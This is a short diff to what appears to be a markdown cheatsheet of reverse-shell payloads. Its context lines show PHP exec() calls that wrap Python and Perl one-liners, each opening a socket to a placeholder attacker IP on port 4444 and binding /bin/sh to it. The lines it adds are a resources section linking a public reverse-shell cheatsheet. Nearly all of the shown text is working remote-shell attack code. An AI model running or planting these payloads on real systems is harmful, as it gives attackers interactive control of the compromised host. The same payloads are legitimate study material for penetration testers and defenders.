@@ -22,3 +22,7 @@ exec("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"[you
 exec("perl -e 'use Socket;$i=\"[your-ip]\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'");
 ?>
 ```
+
+## Resources
+
+- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) — bash / python / perl callbacks
